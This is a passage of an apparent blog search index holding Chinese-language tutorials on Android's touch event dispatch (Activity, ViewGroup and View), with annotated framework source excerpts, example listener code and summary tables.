class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 注册Touch事件监听setOnTouchListener 且 在onTouch()返回false</span></span><br><span class="line">button.setOnTouchListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnTouchListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouch</span><span class="params">(View v, MotionEvent event)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;执行了onTouch(), 动作是:&quot;</span> + event.getAction());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="comment">// 2. 注册点击事件OnClickListener()</span></span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;执行了onClick()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h4 id="测试结果-1"><a href="#测试结果-1" class="headerlink" title="测试结果"></a>测试结果</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行了onTouch(), 动作是:0</span><br><span class="line">执行了onTouch(), 动作是:1</span><br></pre></td></tr></table></figure><h4 id="测试结果说明-1"><a href="#测试结果说明-1" class="headerlink" title="测试结果说明"></a>测试结果说明</h4><ul><li>点击按钮会产生两个类型的事件-按下View与抬起View，所以会回调两次 <strong>onTouch()</strong> ；</li><li>因为 <strong>onTouch()</strong> 返回true，所以事件被消费，不会继续往下传递， <strong>View.dispatchTouchEvent()</strong> 直接返回true；</li><li>所以最终不会调用 <strong>View.onTouchEvent()</strong> ，也不会调用 <strong>onClick()</strong> 。</li></ul><h2 id="三-事件分发机制流程总结"><a href="#三-事件分发机制流程总结" class="headerlink" title="三. 事件分发机制流程总结"></a>三. 事件分发机制流程总结</h2><table><thead><tr><th>类型</th><th>相关方法</th><th>Activity</th><th>ViewGroup</th><th>View</th></tr></thead><tbody><tr><td>事件分发</td><td>dispatchTouchEvent</td><td>√</td><td>√</td><td>√</td></tr><tr><td>事件拦截</td><td>oninterceptTouchEvent</td><td>×</td><td>√</td><td>×</td></tr><tr><td>事件消费</td><td>onTouchEvent</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>这个三个方法均有一个 boolean(布尔) 类型的返回值，通过返回 true 和 false 来控制事件传递的流程。<br>PS: 从上表可以看到 <strong>Activity</strong>和 <strong>View</strong>都是没有事件拦截的，这是因为：</p><ul><li>Activity 作为原始的事件分发者，如果 Activity 拦截了事件会导致整个屏幕都无法响应事件，这肯定不是我们想要的效果。</li><li>View最为事件传递的最末端，要么消费掉事件，要么不处理进行回传，根本没必要进行事件拦截。</li></ul><h4 id="View相关"><a href="#View相关" class="headerlink" title="View相关"></a>View相关</h4><blockquote><p>Question: 为什么 View 会有 dispatchTouchEvent ?</p></blockquote><p>A：<strong>View</strong> 可以注册很多事件监听器，例如：单击事件(<strong>onClick</strong>)、长按事件(<strong>onLongClick</strong>)、触摸事件(<strong>onTouch</strong>)，并且View自身也有<strong>onTouchEvent</strong>方法，那么问题来了，这么多与事件相关的方法应该由谁管理？毋庸置疑就是 <strong>dispatchTouchEvent</strong>，所以 View 也会有事件分发。</p><blockquote><p>Question: 与 View 事件相关的各个方法调用顺序是怎样的？</p></blockquote><p>A：如果不去看源码，想一下让自己设计会怎样？</p><ul><li>单击事件(<strong>onClickListener</strong>) 需要两个事件(<strong>ACTION_DOWN</strong> 和 <strong>ACTION_UP</strong>)才能触发，如果先分配给<strong>onClick</strong>判断，等它判断完，用户手指已经离开屏幕，黄花菜都凉了，定然造成 View 无法响应其他事件，应该最后调用。(最后)</li><li>长按事件(<strong>onLongClickListener</strong>) 同理，也是需要长时间等待才能出结果，肯定不能排到前面，但因为不需要ACTION_UP，应该排在<strong>onClick</strong>前面。(<strong>onLongClickListener</strong>&gt; <strong>onClickListener</strong>)</li><li>触摸事件(<strong>onTouchListener</strong>) ， 如果用户注册了触摸事件，说明用户要自己处理触摸事件，这个应该排在最前面。（最前）、</li><li>View自身处理(<strong>onTouchEvent</strong>) 提供了一种默认的处理方式，如果用户已经处理好了，也就不需要了，所以应该排在onTouchListener后面。(<strong>onTouchListener</strong> &gt; <strong>onTouchEvent</strong>)</li></ul><p><strong>所以事件的调度顺序应该是 onTouchListener&gt; onTouchEvent &gt; onLongClickListener&gt; onClickListener。</strong></p><h4 id="ViewGroup相关"><a href="#ViewGroup相关" class="headerlink" title="ViewGroup相关"></a>ViewGroup相关</h4><p>ViewGroup(通常是各种Layout) 的事件分发相对来说就要麻烦一些，因为 ViewGroup 不仅要考虑自身，还要考虑各种ChildView，一旦处理不好就容易引起各种事件冲突，正所谓养儿方知父母难啊。<br>VIewGroup的事件分发流程又是如何的呢？<br>我们了解到事件是通过ViewGroup一层一层传递的，最终传递给View，ViewGroup要比它的 ChildView 先拿到事件，并且有权决定是否告诉要告诉ChildView。在默认的情况下 ViewGroup事件分发流程是这样的。</p><ol><li>判断自身是否需要(询问 onInterceptTouchEvent 是否拦截)，如果需要，调用自己的 onTouchEvent。</li><li>自身不需要或者不确定，则询问ChildView，一般来说是调用手指触摸位置的 ChildView。</li><li>如果子 ChildView不需要则调用自身的onTouchEvent。</li></ol><p>用伪代码应该是这样子的:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 点击事件产生后</span></span><br><span class="line"><span class="comment">// 步骤1：调用dispatchTouchEvent()</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dispatchTouchEvent</span><span class="params">(MotionEvent ev)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">consume</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">//代表 是否会消费事件</span></span><br><span class="line">    <span class="comment">// 步骤2：判断是否拦截事件</span></span><br><span class="line">    <span class="keyword">if</span> (onInterceptTouchEvent(ev)) &#123;</span><br><span class="line">      <span class="comment">// a. 若拦截，则将该事件交给当前View进行处理</span></span><br><span class="line">      <span class="comment">// 即调用onTouchEvent()去处理点击事件</span></span><br><span class="line">      consume = onTouchEvent (ev) ;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// b. 若不拦截，则将该事件传递到下层</span></span><br><span class="line">      <span class="comment">// 即 下层元素的dispatchTouchEvent()就会被调用，重复上述过程</span></span><br><span class="line">      <span class="comment">// 直到点击事件被最终处理为止</span></span><br><span class="line">      consume = child.dispatchTouchEvent (ev) ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 步骤3：最终返回通知 该事件是否被消费（接收 &amp; 处理）</span></span><br><span class="line">    <span class="keyword">return</span> consume;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>安卓为了保证所有的事件都是被一个 View 消费的，对第一次的事件( ACTION_DOWN )进行了特殊判断，View 只有消费了 ACTION_DOWN 事件，才能接收到后续的事件(可点击控件会默认消费所有事件)，并且会将后续所有事件传递过来，不会再传递给其他 View，除非上层 View 进行了拦截。如果上层 View 拦截了当前正在处理的事件，会收到一个 ACTION_CANCEL，表示当前事件已经结束，后续事件不会再传递过来。</strong></p><h4 id="核心要点"><a href="#核心要点" class="headerlink" title="核心要点"></a>核心要点</h4><ol><li>事件分发原理: 责任链模式，事件层层传递，直到被消费。</li><li>View 的 dispatchTouchEvent主要用于调度自身的监听器和 onTouchEvent。</li><li>View的事件的调度顺序是 onTouchListener &gt; onTouchEvent &gt; onLongClickListener &gt; onClickListener。</li><li>不论View自身是否注册点击事件，只要 View 是可点击的就会消费事件。</li><li>事件是否被消费由返回值决定，true 表示消费，false 表示不消费，与是否使用了事件无关。</li><li>ViewGroup 中可能有多个 ChildView 时，将事件分配给包含点击位置的 ChildView。</li><li>ViewGroup 和 ChildView 同时注册了事件监听器(onClick等)，由 ChildView 消费。</li><li>一次触摸流程中产生事件应被同一 View 消费，全部接收或者全部拒绝。</li><li>只要接受 ACTION_DOWN 就意味着接受所有的事件，拒绝 ACTION_DOWN 则不会收到后续内容。</li><li>如果当前正在处理的事件被上层 View 拦截，会收到一个 ACTION_CANCEL，后续事件不会再传递过来。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 事件分发机制详解（上）</title>
      <link href="/2023/12/17/2023-12-17/"/>
      <url>/2023/12/17/2023-12-17/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Android事件分发机制是Android开发者必须了解的基础。</p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p><img src="/images/20231217/20231217001.png"></p><h3 id="一-基础认知"><a href="#一-基础认知" class="headerlink" title="一. 基础认知"></a>一. 基础认知</h3><h4 id="1-1-事件分发的由来"><a href="#1-1-事件分发的由来" class="headerlink" title="1.1 事件分发的由来"></a>1.1 事件分发的由来</h4><p>安卓的View是树形结构的，View可能会重叠在一起，当我们点击的地方有多个View都可以响应的时候，这个点击事件应该给谁呢？为了解决这一个问题，就有了事件分发机制。</p><h4 id="1-2-事件分发的-“事件”-是指什么？"><a href="#1-2-事件分发的-“事件”-是指什么？" class="headerlink" title="1.2 事件分发的 “事件” 是指什么？"></a>1.2 事件分发的 “事件” 是指什么？</h4><p>点击事件 (Touch事件) 。具体介绍如下：<br><img src="/images/20231217/20231217002.png"><br>特别说明：事件列，即指从手指接触屏幕至手指离开屏幕这个过程产生的一系列事件。一般情况下，事件列都是以DOWN事件开始、UP事件结束，中间有无数的MOVE事件。<br><img src="/images/20231217/20231217003.png"></p><h4 id="1-3-事件分发的本质"><a href="#1-3-事件分发的本质" class="headerlink" title="1.3 事件分发的本质"></a>1.3 事件分发的本质</h4><p>将点击事件（MotionEvent）传递到某个具体的View &amp; 处理的整个过程。</p><blockquote><p>即 事件传递的过程 = 分发过程。</p></blockquote><h4 id="1-4-事件在哪些对象之间进行传递？"><a href="#1-4-事件在哪些对象之间进行传递？" class="headerlink" title="1.4 事件在哪些对象之间进行传递？"></a>1.4 事件在哪些对象之间进行传递？</h4><p>答：Activity、ViewGroup、View。<br><img src="/images/20231217/20231217004.png"></p><table><thead><tr><th>类型</th><th>简介</th><th>备注</th></tr></thead><tbody><tr><td>Activity</td><td>控制生命周期&amp;处理事件(类似 控制器)</td><td>统筹视图的添加 &amp; 显示<br>通过其他回调方法与Window、View交互</td></tr><tr><td>View</td><td>所有UI组件的基类</td><td>一般Button、TextView等控件都是继承父类View</td></tr><tr><td>ViewGroup</td><td>一组View的集合(含多个子View)</td><td>其本身也是View的子类<br>是Android所有布局的父类：如LinearLayout等<br>区别于普通View: ViewGroup实际上也是1个View,只是多了可包含子View &amp; 定义布局参数的功能</td></tr></tbody></table><h4 id="1-5-事件分发的顺序"><a href="#1-5-事件分发的顺序" class="headerlink" title="1.5 事件分发的顺序"></a>1.5 事件分发的顺序</h4><p>即 事件传递的顺序：<strong>Activity</strong> -&gt; <strong>ViewGroup</strong> -&gt; <strong>View</strong></p><blockquote><p>即：1个点击事件发生后，事件先传到<strong>Activity</strong>、再传到<strong>ViewGroup</strong>、最终再传到<strong>View</strong></p></blockquote><h4 id="1-6-事件分发过程由哪些方法协作完成？"><a href="#1-6-事件分发过程由哪些方法协作完成？" class="headerlink" title="1.6 事件分发过程由哪些方法协作完成？"></a>1.6 事件分发过程由哪些方法协作完成？</h4><p>答：<strong>dispatchTouchEvent()<strong>、</strong>onInterceptTouchEvent()</strong> 和 <strong>onTouchEvent()</strong></p><table><thead><tr><th>方法</th><th>作用</th><th>调用时刻</th></tr></thead><tbody><tr><td>dispatchTouchEvent()</td><td>分发（传递） 点击事件</td><td>当点击事件能够传递给当前View时，该方法就会被调用</td></tr><tr><td>onTouchEvent()</td><td>处理点击事件</td><td>在dispatchTouchEvent() 内部调用</td></tr><tr><td>onInterceptTouchEvent()</td><td>判断是否拦截了某个事件<br>只存在于ViewGroup<br>普通的View无该方法</td><td>在ViewGroup的dispatchTouchEvent(）内部调用</td></tr></tbody></table><h3 id="二-事件分发机制流程详细分析"><a href="#二-事件分发机制流程详细分析" class="headerlink" title="二. 事件分发机制流程详细分析"></a>二. 事件分发机制流程详细分析</h3><p>主要包括：<strong>Activity</strong>事件分发机制、<strong>ViewGroup</strong>事件分发机制、<strong>View</strong>事件分发机制</p><h4 id="2-1-Activity事件分发机制"><a href="#2-1-Activity事件分发机制" class="headerlink" title="2.1 Activity事件分发机制"></a>2.1 Activity事件分发机制</h4><p>事件分发机制，首先会将点击事件传递到<strong>Activity</strong>中，具体是执行 <strong>dispatchTouchEvent()</strong> 进行事件分发。<br>源码分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 源码分析：Activity.dispatchTouchEvent（）</span></span><br><span class="line"><span class="comment">  */</span> </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dispatchTouchEvent</span><span class="params">(MotionEvent ev)</span> &#123;</span><br><span class="line">    <span class="comment">// 仅贴出核心代码</span></span><br><span class="line">    <span class="comment">// -&gt;&gt;分析1</span></span><br><span class="line">    <span class="keyword">if</span> (getWindow().superDispatchTouchEvent(ev)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 若getWindow().superDispatchTouchEvent(ev)的返回true</span></span><br><span class="line">        <span class="comment">// 则Activity.dispatchTouchEvent（）就返回true，则方法结束。即 ：该点击事件停止往下传递 &amp; 事件传递过程结束</span></span><br><span class="line">        <span class="comment">// 否则：继续往下调用Activity.onTouchEvent</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// -&gt;&gt;分析3</span></span><br><span class="line">    <span class="keyword">return</span> onTouchEvent(ev);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 分析1：getWindow().superDispatchTouchEvent(ev)</span></span><br><span class="line"><span class="comment">  * 说明：</span></span><br><span class="line"><span class="comment">  *     a. getWindow() = 获取Window类的对象</span></span><br><span class="line"><span class="comment">  *     b. Window类是抽象类，其唯一实现类 = PhoneWindow类</span></span><br><span class="line"><span class="comment">  *     c. Window类的superDispatchTouchEvent() = 1个抽象方法，由子类PhoneWindow类实现</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">superDispatchTouchEvent</span><span class="params">(MotionEvent event)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> mDecor.superDispatchTouchEvent(event);</span><br><span class="line">      <span class="comment">// mDecor = 顶层View（DecorView）的实例对象</span></span><br><span class="line">      <span class="comment">// -&gt;&gt; 分析2</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 分析2：mDecor.superDispatchTouchEvent(event)</span></span><br><span class="line"><span class="comment">  * 定义：属于顶层View（DecorView）</span></span><br><span class="line"><span class="comment">  * 说明：</span></span><br><span class="line"><span class="comment">  *     a. DecorView类是PhoneWindow类的一个内部类</span></span><br><span class="line"><span class="comment">  *     b. DecorView继承自FrameLayout，是所有界面的父类</span></span><br><span class="line"><span class="comment">  *     c. FrameLayout是ViewGroup的子类，故DecorView的间接父类 = ViewGroup</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">superDispatchTouchEvent</span><span class="params">(MotionEvent event)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">super</span>.dispatchTouchEvent(event);</span><br><span class="line">      <span class="comment">// 调用父类的方法 = ViewGroup的dispatchTouchEvent()</span></span><br><span class="line">      <span class="comment">// 即将事件传递到ViewGroup去处理，详细请看后续章节分析的ViewGroup的事件分发机制</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 回到最初的分析2入口处</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 分析3：Activity.onTouchEvent()</span></span><br><span class="line"><span class="comment">  * 调用场景：当一个点击事件未被Activity下任何一个View接收/处理时，就会调用该方法</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouchEvent</span><span class="params">(MotionEvent event)</span> &#123;</span><br><span class="line">        <span class="comment">// -&gt;&gt; 分析5</span></span><br><span class="line">        <span class="keyword">if</span> (mWindow.shouldCloseOnTouch(<span class="built_in">this</span>, event)) &#123;</span><br><span class="line">            finish();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 即 只有在点击事件在Window边界外才会返回true，一般情况都返回false，分析完毕</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 分析4：mWindow.shouldCloseOnTouch(this, event)</span></span><br><span class="line"><span class="comment">  * 作用：主要是对于处理边界外点击事件的判断：是否是DOWN事件，event的坐标是否在边界内等</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldCloseOnTouch</span><span class="params">(Context context, MotionEvent event)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (mCloseOnTouchOutside &amp;&amp; event.getAction() == MotionEvent.ACTION_DOWN</span><br><span class="line">          &amp;&amp; isOutOfBounds(context, event) &amp;&amp; peekDecorView() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回true：说明事件在边界外，即 消费事件</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回false：在边界内，即未消费（默认）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="源码总结"><a href="#源码总结" class="headerlink" title="源码总结"></a>源码总结</h3><p>当一个点击事件发生时，从Activity的事件分发开始（ <strong>Activity.dispatchTouchEvent()</strong> ），流程总结如下：<br><img src="/images/20231217/20231217005.png"></p><h3 id="核心方法总结"><a href="#核心方法总结" class="headerlink" title="核心方法总结"></a>核心方法总结</h3><p>主要包括：dispatchTouchEvent()、onTouchEvent() 总结如下：<br><img src="/images/20231217/20231217006.png"></p><p>那么<strong>ViewGroup</strong>的<strong>dispatchTouchEvent()</strong> 什么时候返回true / false? 请继续往下看<strong>ViewGroup</strong>事件的分发机制。</p><h3 id="2-2-ViewGroup事件分发机制"><a href="#2-2-ViewGroup事件分发机制" class="headerlink" title="2.2 ViewGroup事件分发机制"></a>2.2 ViewGroup事件分发机制</h3><p>从上面Activity的事件分发机制可知，在 <strong>Activity.dispatchTouchEvent()</strong> 实现了将事件从<strong>Activity</strong> -&gt; <strong>ViewGroup</strong> 的传递，ViewGroup的事件分发机制从 <strong>dispatchTouchEvent()</strong> 开始。</p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 源码分析：ViewGroup.dispatchTouchEvent（）</span></span><br><span class="line"><span class="comment">  */</span> </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dispatchTouchEvent</span><span class="params">(MotionEvent ev)</span> &#123; </span><br><span class="line">  <span class="comment">// 仅贴出关键代码</span></span><br><span class="line">  ... </span><br><span class="line">  <span class="keyword">if</span> (disallowIntercept || !onInterceptTouchEvent(ev)) &#123;  </span><br><span class="line">  <span class="comment">// 分析1：ViewGroup每次事件分发时，都需调用onInterceptTouchEvent()询问是否拦截事件</span></span><br><span class="line">    <span class="comment">// 判断值1-disallowIntercept：是否禁用事件拦截的功能(默认是false)，可通过调用requestDisallowInterceptTouchEvent()修改</span></span><br><span class="line">    <span class="comment">// 判断值2-!onInterceptTouchEvent(ev) ：对onInterceptTouchEvent()返回值取反</span></span><br><span class="line">        <span class="comment">// a. 若在onInterceptTouchEvent()中返回false，即不拦截事件，从而进入到条件判断的内部</span></span><br><span class="line">        <span class="comment">// b. 若在onInterceptTouchEvent()中返回true，即拦截事件，从而跳出了该条件判断</span></span><br><span class="line">        <span class="comment">// c. 关于onInterceptTouchEvent() -&gt;&gt;分析1</span></span><br><span class="line">  <span class="comment">// 分析2</span></span><br><span class="line">    <span class="comment">// 1. 通过for循环，遍历当前ViewGroup下的所有子View</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> count - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">View</span> <span class="variable">child</span> <span class="operator">=</span> children[i];  </span><br><span class="line">        <span class="keyword">if</span> ((child.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE  </span><br><span class="line">                || child.getAnimation() != <span class="literal">null</span>) &#123;  </span><br><span class="line">            child.getHitRect(frame);  </span><br><span class="line">            <span class="comment">// 2. 判断当前遍历的View是不是正在点击的View，从而找到当前被点击的View</span></span><br><span class="line">            <span class="keyword">if</span> (frame.contains(scrolledXInt, scrolledYInt)) &#123;  </span><br><span class="line">                <span class="keyword">final</span> <span class="type">float</span> <span class="variable">xc</span> <span class="operator">=</span> scrolledXFloat - child.mLeft;  </span><br><span class="line">                <span class="keyword">final</span> <span class="type">float</span> <span class="variable">yc</span> <span class="operator">=</span> scrolledYFloat - child.mTop;  </span><br><span class="line">                ev.setLocation(xc, yc);  </span><br><span class="line">                child.mPrivateFlags &amp;= ~CANCEL_NEXT_UP_EVENT;  </span><br><span class="line">                <span class="comment">// 3. 条件判断的内部调用了该View的dispatchTouchEvent()</span></span><br><span class="line">                <span class="comment">// 即 实现了点击事件从ViewGroup到子View的传递（具体请看下面章节介绍的View事件分发机制）</span></span><br><span class="line">                <span class="keyword">if</span> (child.dispatchTouchEvent(ev))  &#123; </span><br><span class="line">                <span class="comment">// 调用子View的dispatchTouchEvent后是有返回值的</span></span><br><span class="line">                <span class="comment">// 若该控件可点击，那么点击时dispatchTouchEvent的返回值必定是true，因此会导致条件判断成立</span></span><br><span class="line">                <span class="comment">// 于是给ViewGroup的dispatchTouchEvent()直接返回了true，即直接跳出</span></span><br><span class="line">                <span class="comment">// 即该子View把ViewGroup的点击事件消费掉了</span></span><br><span class="line">                mMotionTarget = child;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">                      &#125;  </span><br><span class="line">                  &#125;  </span><br><span class="line">              &#125;  </span><br><span class="line">          &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">super</span>.dispatchTouchEvent(ev);</span><br><span class="line">  <span class="comment">// 若无任何View接收事件(如点击空白处)/ViewGroup本身拦截了事件(复写了onInterceptTouchEvent()返回true)</span></span><br><span class="line">  <span class="comment">// 会调用ViewGroup父类的dispatchTouchEvent()，即View.dispatchTouchEvent()</span></span><br><span class="line">  <span class="comment">// 因此会执行ViewGroup的onTouch() -&gt; onTouchEvent() -&gt; performClick（） -&gt; onClick()，即自己处理该事件，事件不会往下传递</span></span><br><span class="line">  <span class="comment">// 具体请参考View事件分发机制中的View.dispatchTouchEvent()</span></span><br><span class="line">  ... </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 分析1：ViewGroup.onInterceptTouchEvent()</span></span><br><span class="line"><span class="comment">  * 作用：是否拦截事件</span></span><br><span class="line"><span class="comment">  * 说明：</span></span><br><span class="line"><span class="comment">  *     a. 返回false：不拦截（默认）</span></span><br><span class="line"><span class="comment">  *     b. 返回true：拦截，即事件停止往下传递（需手动复写onInterceptTouchEvent()其返回true）</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onInterceptTouchEvent</span><span class="params">(MotionEvent ev)</span> &#123;  </span><br><span class="line">    <span class="comment">// 默认不拦截</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">// 回到调用原处</span></span><br></pre></td></tr></table></figure><h4 id="源码总结-1"><a href="#源码总结-1" class="headerlink" title="源码总结"></a>源码总结</h4><p>Android事件分发传递到Acitivity后，总是先传递到 <strong>ViewGroup</strong> 、再传递到 <strong>View</strong> 。流程总结如下：(假设已经经过了Acitivity事件分发传递并传递到 <strong>ViewGroup</strong> )<br><img src="/images/20231217/20231217007.png"></p><h4 id="核心方法总结-1"><a href="#核心方法总结-1" class="headerlink" title="核心方法总结"></a>核心方法总结</h4><p>主要包括： <strong>dispatchTouchEvent()</strong> 、 <strong>onTouchEvent()</strong> 、 <strong>onInterceptTouchEvent()</strong> 总结如下：<br><img src="/images/20231217/20231217008.png"></p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><h4 id="1-布局说明"><a href="#1-布局说明" class="headerlink" title="1. 布局说明"></a>1. 布局说明</h4><p><img src="/images/20231217/20231217009.png"></p><h4 id="2-测试代码"><a href="#2-测试代码" class="headerlink" title="2. 测试代码"></a>2. 测试代码</h4><p>布局文件：activity_main.xml</p><figure 